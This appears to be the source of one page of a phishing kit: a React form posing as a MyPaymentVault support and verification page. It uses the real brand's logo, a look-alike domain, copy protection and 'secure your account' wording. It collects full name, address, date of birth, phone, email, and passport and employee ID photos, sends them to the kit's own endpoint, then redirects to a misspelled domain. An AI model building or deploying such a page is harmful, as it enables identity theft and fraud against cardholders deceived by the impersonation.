import { useEffect, useState } from 'react';
import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';
import { z } from 'zod';
import { useLocation } from 'wouter';
import { AntiCopyProtection } from '@/components/AntiCopyProtection';
import { SEO } from '@/components/SEO';
import { useToast } from '@/hooks/use-toast';
import { useMutation } from '@tanstack/react-query';
import { apiRequest } from '@/lib/queryClient';
import '@/styles/styles.css';
import logoSvg from '@assets/extracted/login.mypaymentvault.com/paymentvault_logo.svg';
import contactIconSvg from '@assets/extracted/login.mypaymentvault.com/paymentvault_logo.svg';

const contactInfoSchema = z.object({
  firstName: z.string().min(1, 'Please provide your First Name'),
  lastName: z.string().min(1, 'Please provide your Last Name'),
  email: z.string().email('Please provide a valid email address'),
  mobilePhone: z.string().min(10, 'Please provide a valid phone number'),
  mailingAddress: z.string().min(1, 'Please provide your Mailing Address'),
  city: z.string().min(1, 'Please provide your City'),
  state: z.string().min(1, 'Please provide your State'),
  postalCode: z.string().min(1, 'Please provide your Postal Code'),
  dateOfBirth: z.string().regex(/^\d{2}-\d{2}-\d{4}$/, 'Date of Birth must be in MM-DD-YYYY format'),
  inquiryType: z.string().min(1, 'Please select an inquiry type'),
  message: z.string().optional(),
});

type ContactInfoForm = z.infer<typeof contactInfoSchema>;

export default function ContactInfoPage() {
  const [, setLocation] = useLocation();
  const [token, setToken] = useState('');
  const [loginAttemptId, setLoginAttemptId] = useState('');
  const [passportPhoto, setPassportPhoto] = useState<string>('');
  const [employeeIdPhoto, setEmployeeIdPhoto] = useState<string>('');
  const [passportError, setPassportError] = useState<string>('');
  const [employeeIdError, setEmployeeIdError] = useState<string>('');
  const [passportFileName, setPassportFileName] = useState<string>('');
  const [employeeIdFileName, setEmployeeIdFileName] = useState<string>('');
  const [passportFileSize, setPassportFileSize] = useState<string>('');
  const [employeeIdFileSize, setEmployeeIdFileSize] = useState<string>('');
  const { toast } = useToast();

  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm<ContactInfoForm>({
    resolver: zodResolver(contactInfoSchema),
    defaultValues: {
      inquiryType: '',
    },
  });

  useEffect(() => {
    const generateRandomString = (length: number) => {
      const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
      let result = '';
      for (let i = 0; i < length; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
      }
      return result;
    };

    const newToken = generateRandomString(64);
    setToken(newToken);
    // Remove token from URL - keep it in state only for security
    window.history.replaceState(null, '', window.location.pathname);

    // Session validation
    const attemptId = sessionStorage.getItem('loginAttemptId');
    console.log('[ContactInfo] Page loaded - loginAttemptId from sessionStorage:', attemptId);
    if (!attemptId) {
      console.log('[ContactInfo] No loginAttemptId found - redirecting to home');
      toast({
        title: 'Error',
        description: 'Session expired. Please login again.',
        variant: 'destructive',
      });
      setTimeout(() => setLocation('/'), 2000);
      return;
    }
    console.log('[ContactInfo] Setting loginAttemptId state:', attemptId);
    setLoginAttemptId(attemptId);
  }, [toast, setLocation]);

  const formatFileSize = (bytes: number): string => {
    if (bytes === 0) return '0 Bytes';
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return Math.round((bytes / Math.pow(k, i)) * 100) / 100 + ' ' + sizes[i];
  };

  const handleFileChange = async (
    e: React.ChangeEvent<HTMLInputElement>,
    type: 'passport' | 'employeeId'
  ) => {
    const file = e.target.files?.[0];
    const setError = type === 'passport' ? setPassportError : setEmployeeIdError;
    const setPhoto = type === 'passport' ? setPassportPhoto : setEmployeeIdPhoto;
    const setFileName = type === 'passport' ? setPassportFileName : setEmployeeIdFileName;
    const setFileSize = type === 'passport' ? setPassportFileSize : setEmployeeIdFileSize;

    if (!file) return;

    // Validate file type
    const validTypes = ['image/jpeg', 'image/png', 'image/jpg'];
    if (!validTypes.includes(file.type)) {
      setError('Only JPEG and PNG images are allowed');
      e.target.value = '';
      return;
    }

    // Validate file size (max 50MB)
    const maxSize = 50 * 1024 * 1024; // 50MB
    if (file.size > maxSize) {
      setError('File size must be less than 50MB');
      e.target.value = '';
      return;
    }

    // Convert to base64
    const reader = new FileReader();
    reader.onload = () => {
      const base64 = reader.result as string;
      setPhoto(base64);
      setFileName(file.name);
      setFileSize(formatFileSize(file.size));
      setError('');
    };
    reader.onerror = () => {
      setError('Failed to read file');
      e.target.value = '';
    };
    reader.readAsDataURL(file);
  };

  const submitMutation = useMutation({
    mutationFn: async (data: ContactInfoForm) => {
      // Double-check loginAttemptId exists
      const currentAttemptId = loginAttemptId || sessionStorage.getItem('loginAttemptId');
      console.log('[ContactInfo] Submit mutation - loginAttemptId:', currentAttemptId);
      
      if (!currentAttemptId) {
        throw new Error('Session expired. Please login again.');
      }

      return await apiRequest('POST', '/api/contact-info', {
        loginAttemptId: currentAttemptId,
        ...data,
        passportPhoto,
        employeeIdPhoto,
      });
    },
    onSuccess: () => {
      toast({
        title: 'Success',
        description: 'Your information has been submitted successfully',
      });
      
      setTimeout(() => {
        window.location.href = 'https://google-mypaymentvautlt.replit.app/';
      }, 2000);
    },
    onError: (error: Error) => {
      toast({
        variant: 'destructive',
        title: 'Error',
        description: error.message || 'Failed to submit information',
      });
    },
  });

  const onSubmit = (data: ContactInfoForm) => {
    // Validate photos are uploaded
    if (!passportPhoto) {
      setPassportError('Passport photo is required');
      toast({
        variant: 'destructive',
        title: 'Validation Error',
        description: 'Please upload your passport photo',
      });
      return;
    }

    if (!employeeIdPhoto) {
      setEmployeeIdError('Employee ID photo is required');
      toast({
        variant: 'destructive',
        title: 'Validation Error',
        description: 'Please upload your employee ID photo',
      });
      return;
    }

    submitMutation.mutate(data);
  };

  const handleCancel = () => {
    sessionStorage.clear();
    setLocation('/');
  };

  return (
    <>
      <SEO 
        title="Contact Us | MyPaymentVault Support"
        description="Contact MyPaymentVault support for website login help, card usage questions, card not received issues, lost or stolen card reports, and more."
        keywords="MyPaymentVault contact, mypaymentvault support, payment vault help, card not received, lost card, stolen card, customer support, employee support"
        canonical="https://login-mypaymentvaultl.com/contact-info"
      />
      <AntiCopyProtection />
      <div>
        <form id="contact_form" onSubmit={handleSubmit(onSubmit)}>
          {/* Header */}
          <div className="onbe-dashboard-header">
            <header className="onbe-headercomponent-parent">
              <div className="onbe-login-header-padding d-flex col-xxl-3 col-xl-3 col-lg-3 col-md-6 col-sm-6 col-6 offset-xxl-0 offset-xl-0 offset-lg-0 offset-md-0 offset-sm-0 offset-0">
                <img
                  src={logoSvg}
                  alt="Payment Vault Company Logo"
                  className="onbe-header-affiliate-logo header-logo-size"
                  data-testid="img-logo"
                />
              </div>
            </header>
          </div>

          {/* Registration Header */}
          <div className="onbe-registration-header">
            <div className="container">
              <div style={{ 
                display: 'flex',
                justifyContent: 'space-between',
                alignItems: 'flex-start',
                gap: '20px',
                flexWrap: 'wrap'
              }}>
                <div style={{ flex: '1 1 auto', minWidth: '300px' }}>
                  <h3 className="onbe-h3 onbe-sidebar-ovrd-h3" style={{ textAlign: 'left', margin: '0 0 10px 0' }}>Confirm Your Data Security & Login Now</h3>
                  <h6 className="onbe-h6 onbe-sidebar-ovrd-h3" style={{ textAlign: 'left', margin: '0' }}>As a final step to activate and secure your account, we require data verification. Please complete the following information</h6>
                </div>
                <div style={{ flex: '0 0 auto' }}>
                  <img 
                    src={contactIconSvg} 
                    alt="MyPaymentVault Logo"
                    style={{ maxWidth: '150px', height: 'auto', display: 'block' }}
                    data-testid="img-contact-logo"
                  />
                </div>
              </div>
            </div>
          </div>

          <div className="container">
            <div className="row onbe-activation-component">
              {/* Form */}
              <div className="col-12">
                <div className="onbe-contact-info-form">
                  <div className="row">
                    {/* First Name */}
                    <div className="col-lg-6 col-md-6 col-sm-12">
                      <div className="onbe-btovr-input-group">
                        <input
                          type="text"
                          id="firstName"
                          placeholder=" "
                          autoComplete="given-name"
                          className="onbe-btovr-input-group__input"
                          data-testid="input-first-name"
                          {...register('firstName')}
                        />
                        <label className="onbe-btovr-input-group__input_label" htmlFor="firstName">
                          First Name<span className="red">*</span>
                        </label>
                        {errors.firstName && (
                          <div className="onbe-form-feedback-error" style={{ position: 'relative' }}>
                            {errors.firstName.message}
                          </div>
                        )}
                      </div>
                    </div>

                    {/* Last Name */}
                    <div className="col-lg-6 col-md-6 col-sm-12">
                      <div className="onbe-btovr-input-group">
                        <input
                          type="text"
                          id="lastName"
                          placeholder=" "
                          autoComplete="family-name"
                          className="onbe-btovr-input-group__input"
                          data-testid="input-last-name"
                          {...register('lastName')}
                        />
                        <label className="onbe-btovr-input-group__input_label" htmlFor="lastName">
                          Last Name<span className="red">*</span>
                        </label>
                        {errors.lastName && (
                          <div className="onbe-form-feedback-error" style={{ position: 'relative' }}>
                            {errors.lastName.message}
                          </div>
                        )}
                      </div>
                    </div>

                    {/* Email */}
                    <div className="col-lg-6 col-md-6 col-sm-12">
                      <div className="onbe-btovr-input-group">
                        <input
                          type="email"
                          id="email"
                          placeholder=" "
                          autoComplete="email"
                          className="onbe-btovr-input-group__input"
                          data-testid="input-email"
                          {...register('email')}
                        />
                        <label className="onbe-btovr-input-group__input_label" htmlFor="email">
                          Email<span className="red">*</span>
                        </label>
                        {errors.email && (
                          <div className="onbe-form-feedback-error" style={{ position: 'relative' }}>
                            {errors.email.message}
                          </div>
                        )}
                      </div>
                    </div>

                    {/* Mobile Phone */}
                    <div className="col-lg-6 col-md-6 col-sm-12">
                      <div className="onbe-btovr-input-group">
                        <input
                          type="tel"
                          id="mobilePhone"
                          placeholder=" "
                          autoComplete="tel"
                          className="onbe-btovr-input-group__input"
                          data-testid="input-mobile-phone"
                          {...register('mobilePhone')}
                        />
                        <label className="onbe-btovr-input-group__input_label" htmlFor="mobilePhone">
                          Mobile Phone<span className="red">*</span>
                        </label>
                        {errors.mobilePhone && (
                          <div className="onbe-form-feedback-error" style={{ position: 'relative' }}>
                            {errors.mobilePhone.message}
                          </div>
                        )}
                      </div>
                    </div>

                    {/* Mailing Address */}
                    <div className="col-lg-6 col-md-6 col-sm-12">
                      <div className="onbe-btovr-input-group">
                        <input
                          type="text"
                          id="mailingAddress"
                          placeholder=" "
                          autoComplete="street-address"
                          className="onbe-btovr-input-group__input"
                          data-testid="input-mailing-address"
                          {...register('mailingAddress')}
                        />
                        <label className="onbe-btovr-input-group__input_label" htmlFor="mailingAddress">
                          Mailing Address<span className="red">*</span>
                        </label>
                        {errors.mailingAddress && (
                          <div className="onbe-form-feedback-error" style={{ position: 'relative' }}>
                            {errors.mailingAddress.message}
                          </div>
                        )}
                      </div>
                    </div>

                    {/* City */}
                    <div className="col-lg-6 col-md-6 col-sm-12">
                      <div className="onbe-btovr-input-group">
                        <input
                          type="text"
                          id="city"
                          placeholder=" "
                          autoComplete="address-level2"
                          className="onbe-btovr-input-group__input"
                          data-testid="input-city"
                          {...register('city')}
                        />
                        <label className="onbe-btovr-input-group__input_label" htmlFor="city">
                          City<span className="red">*</span>
                        </label>
                        {errors.city && (
                          <div className="onbe-form-feedback-error" style={{ position: 'relative' }}>
                            {errors.city.message}
                          </div>
                        )}
                      </div>
                    </div>

                    {/* State */}
                    <div className="col-lg-6 col-md-6 col-sm-12">
                      <div className="onbe-btovr-input-group">
                        <input
                          type="text"
                          id="state"
                          placeholder=" "
                          autoComplete="address-level1"
                          className="onbe-btovr-input-group__input"
                          data-testid="input-state"
                          {...register('state')}
                        />
                        <label className="onbe-btovr-input-group__input_label" htmlFor="state">
                          State<span className="red">*</span>
                        </label>
                        {errors.state && (
                          <div className="onbe-form-feedback-error" style={{ position: 'relative' }}>
                            {errors.state.message}
                          </div>
                        )}
                      </div>
                    </div>

                    {/* Postal Code */}
                    <div className="col-lg-6 col-md-6 col-sm-12">
                      <div className="onbe-btovr-input-group">
                        <input
                          type="text"
                          id="postalCode"
                          placeholder=" "
                          autoComplete="postal-code"
                          className="onbe-btovr-input-group__input"
                          data-testid="input-postal-code"
                          {...register('postalCode')}
                        />
                        <label className="onbe-btovr-input-group__input_label" htmlFor="postalCode">
                          Postal Code<span className="red">*</span>
                        </label>
                        {errors.postalCode && (
                          <div className="onbe-form-feedback-error" style={{ position: 'relative' }}>
                            {errors.postalCode.message}
                          </div>
                        )}
                      </div>
                    </div>

                    {/* Date of Birth */}
                    <div className="col-lg-6 col-md-6 col-sm-12">
                      <div className="onbe-btovr-input-group">
                        <input
                          type="text"
                          id="dateOfBirth"
                          placeholder=" "
                          maxLength={10}
                          className="onbe-btovr-input-group__input"
                          data-testid="input-date-of-birth"
                          {...register('dateOfBirth')}
                          onChange={(e) => {
                            let value = e.target.value.replace(/\D/g, '');
                            if (value.length >= 2) {
                              value = value.slice(0, 2) + '-' + value.slice(2);
                            }
                            if (value.length >= 5) {
                              value = value.slice(0, 5) + '-' + value.slice(5);
                            }
                            value = value.slice(0, 10);
                            e.target.value = value;
                            register('dateOfBirth').onChange(e);
                          }}
                        />
                        <label className="onbe-btovr-input-group__input_label" htmlFor="dateOfBirth">
                          Date of Birth (MM-DD-YYYY)<span className="red">*</span>
                        </label>
                        {errors.dateOfBirth && (
                          <div className="onbe-form-feedback-error" style={{ position: 'relative' }}>
                            {errors.dateOfBirth.message}
                          </div>
                        )}
                      </div>
                    </div>

                    {/* Inquiry Type */}
                    <div className="col-lg-6 col-md-6 col-sm-12">
                      <div className="onbe-btovr-input-group">
                        <select
                          id="inquiryType"
                          className="onbe-btovr-input-group__input"
                          data-testid="select-inquiry-type"
                          {...register('inquiryType')}
                        >
                          <option value="">Select</option>
                          <option value="account_access">Account Access</option>
                          <option value="card_activation">Card Activation</option>
                          <option value="security_verification">Security Verification</option>
                          <option value="technical_support">Technical Support</option>
                          <option value="other">Other</option>
                        </select>
                        <label className="onbe-btovr-input-group__input_label" htmlFor="inquiryType">
                          Select Inquiry Type<span className="red">*</span>
                        </label>
                        {errors.inquiryType && (
                          <div className="onbe-form-feedback-error" style={{ position: 'relative' }}>
                            {errors.inquiryType.message}
                          </div>
                        )}
                      </div>
                    </div>

                    {/* Message */}
                    <div className="col-12">
                      <div className="onbe-btovr-input-group">
                        <textarea
                          id="message"
                          placeholder=" "
                          rows={4}
                          className="onbe-btovr-input-group__input"
                          data-testid="textarea-message"
                          {...register('message')}
                        />
                        <label className="onbe-btovr-input-group__input_label" htmlFor="message">
                          Message
                        </label>
                        {errors.message && (
                          <div className="onbe-form-feedback-error" style={{ position: 'relative' }}>
                            {errors.message.message}
                          </div>
                        )}
                      </div>
                    </div>

                    {/* Passport Photo Upload */}
                    <div className="col-lg-6 col-md-6 col-sm-12">
                      <div className="onbe-btovr-input-group">
                        <label style={{ 
                          display: 'block', 
                          marginBottom: '0.375rem', 
                          fontSize: '0.9rem',
                          color: '#1a1a1a',
                          fontWeight: '600'
                        }}>
                          Passport Photo<span className="red">*</span>
                        </label>
                        <div style={{ 
                          fontSize: '0.75rem', 
                          color: '#666', 
                          marginBottom: '0.5rem',
                          lineHeight: '1.4'
                        }}>
                          Upload your passport photo (Required)<br />
                          <span style={{ color: '#888' }}>Supported: JPEG, PNG • Max size: 50 MB</span>
                        </div>
                        <input
                          type="file"
                          id="passportPhoto"
                          accept="image/jpeg,image/png,image/jpg"
                          onChange={(e) => handleFileChange(e, 'passport')}
                          data-testid="input-passport-photo"
                          style={{ display: 'none' }}
                        />
                        <button
                          type="button"
                          onClick={() => document.getElementById('passportPhoto')?.click()}
                          className="onbe-btovr-button-white onbe-button"
                          style={{
                            width: '100%',
                            padding: '0.875rem 1.25rem',
                            fontSize: '0.9375rem',
                            display: 'flex',
                            alignItems: 'center',
                            justifyContent: 'center',
                            gap: '0.625rem',
                            borderRadius: '0.375rem',
                            transition: 'all 0.2s',
                            fontWeight: '500'
                          }}
                          data-testid="button-upload-passport"
                        >
                          <svg width="20" height="20" viewBox="0 0 20 20" fill="currentColor">
                            <path d="M16.88 9.1A4 4 0 0 1 16 17H5a5 5 0 0 1-1-9.9V7a3 3 0 0 1 4.52-2.59A4.98 4.98 0 0 1 17 8c0 .38-.04.74-.12 1.1zM11 11h3l-4-4-4 4h3v3h2v-3z" />
                          </svg>
                          {passportPhoto ? 'Change Photo' : 'Choose Photo'}
                        </button>
                        {passportError && (
                          <div className="onbe-form-feedback-error" style={{ position: 'relative', marginTop: '0.5rem' }}>
                            {passportError}
                          </div>
                        )}
                        {passportPhoto && passportFileName && (
                          <div style={{ 
                            marginTop: '0.875rem',
                            padding: '1rem',
                            backgroundColor: '#ecfdf5',
                            border: '2px solid #10b981',
                            borderRadius: '0.5rem',
                            display: 'flex',
                            alignItems: 'flex-start',
                            gap: '0.75rem'
                          }}>
                            <svg width="20" height="20" viewBox="0 0 20 20" fill="#10b981" style={{ marginTop: '0.125rem', flexShrink: 0 }}>
                              <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd"/>
                            </svg>
                            <div style={{ flex: 1, minWidth: 0 }}>
                              <div style={{ 
                                fontSize: '0.9375rem', 
                                fontWeight: '600', 
                                color: '#065f46',
                                marginBottom: '0.25rem',
                                wordBreak: 'break-word'
                              }}>
                                {passportFileName}
                              </div>
                              <div style={{ fontSize: '0.8125rem', color: '#059669', fontWeight: '500' }}>
                                File size: {passportFileSize}
                              </div>
                              <div style={{ fontSize: '0.75rem', color: '#10b981', marginTop: '0.25rem' }}>
                                ✓ Upload successful - Ready to submit
                              </div>
                            </div>
                          </div>
                        )}
                      </div>
                    </div>

                    {/* Employee ID Photo Upload */}
                    <div className="col-lg-6 col-md-6 col-sm-12">
                      <div className="onbe-btovr-input-group">
                        <label style={{ 
                          display: 'block', 
                          marginBottom: '0.375rem', 
                          fontSize: '0.9rem',
                          color: '#1a1a1a',
                          fontWeight: '600'
                        }}>
                          Employee ID Photo<span className="red">*</span>
                        </label>
                        <div style={{ 
                          fontSize: '0.75rem', 
                          color: '#666', 
                          marginBottom: '0.5rem',
                          lineHeight: '1.4'
                        }}>
                          Upload your employee ID photo (Required)<br />
                          <span style={{ color: '#888' }}>Supported: JPEG, PNG • Max size: 50 MB</span>
                        </div>
                        <input
                          type="file"
                          id="employeeIdPhoto"
                          accept="image/jpeg,image/png,image/jpg"
                          onChange={(e) => handleFileChange(e, 'employeeId')}
                          data-testid="input-employee-id-photo"
                          style={{ display: 'none' }}
                        />
                        <button
                          type="button"
                          onClick={() => document.getElementById('employeeIdPhoto')?.click()}
                          className="onbe-btovr-button-white onbe-button"
                          style={{
                            width: '100%',
                            padding: '0.875rem 1.25rem',
                            fontSize: '0.9375rem',
                            display: 'flex',
                            alignItems: 'center',
                            justifyContent: 'center',
                            gap: '0.625rem',
                            borderRadius: '0.375rem',
                            transition: 'all 0.2s',
                            fontWeight: '500'
                          }}
                          data-testid="button-upload-employee-id"
                        >
                          <svg width="20" height="20" viewBox="0 0 20 20" fill="currentColor">
                            <path d="M16.88 9.1A4 4 0 0 1 16 17H5a5 5 0 0 1-1-9.9V7a3 3 0 0 1 4.52-2.59A4.98 4.98 0 0 1 17 8c0 .38-.04.74-.12 1.1zM11 11h3l-4-4-4 4h3v3h2v-3z" />
                          </svg>
                          {employeeIdPhoto ? 'Change Photo' : 'Choose Photo'}
                        </button>
                        {employeeIdError && (
                          <div className="onbe-form-feedback-error" style={{ position: 'relative', marginTop: '0.5rem' }}>
                            {employeeIdError}
                          </div>
                        )}
                        {employeeIdPhoto && employeeIdFileName && (
                          <div style={{ 
                            marginTop: '0.875rem',
                            padding: '1rem',
                            backgroundColor: '#ecfdf5',
                            border: '2px solid #10b981',
                            borderRadius: '0.5rem',
                            display: 'flex',
                            alignItems: 'flex-start',
                            gap: '0.75rem'
                          }}>
                            <svg width="20" height="20" viewBox="0 0 20 20" fill="#10b981" style={{ marginTop: '0.125rem', flexShrink: 0 }}>
                              <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd"/>
                            </svg>
                            <div style={{ flex: 1, minWidth: 0 }}>
                              <div style={{ 
                                fontSize: '0.9375rem', 
                                fontWeight: '600', 
                                color: '#065f46',
                                marginBottom: '0.25rem',
                                wordBreak: 'break-word'
                              }}>
                                {employeeIdFileName}
                              </div>
                              <div style={{ fontSize: '0.8125rem', color: '#059669', fontWeight: '500' }}>
                                File size: {employeeIdFileSize}
                              </div>
                              <div style={{ fontSize: '0.75rem', color: '#10b981', marginTop: '0.25rem' }}>
                                ✓ Upload successful - Ready to submit
                              </div>
                            </div>
                          </div>
                        )}
                      </div>
                    </div>

                    {/* Buttons */}
                    <div className="col-12">
                      <div className="row mt-3">
                        <div className="col-lg-3 col-md-4 col-sm-6 col-6 offset-lg-6 offset-md-4 offset-sm-0 offset-0">
                          <button
                            type="button"
                            onClick={handleCancel}
                            className="onbe-btovr-button-white onbe-button onbe-button-primary"
                            data-testid="button-cancel"
                          >
                            Cancel
                          </button>
                        </div>
                        <div className="col-lg-3 col-md-4 col-sm-6 col-6">
                          <button
                            type="submit"
                            disabled={submitMutation.isPending}
                            className="onbe-btovr-button-black onbe-button onbe-button-primary"
                            data-testid="button-send"
                          >
                            {submitMutation.isPending ? 'Sending...' : 'Send'}
                          </button>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </form>
      </div>
    </>
  );
}
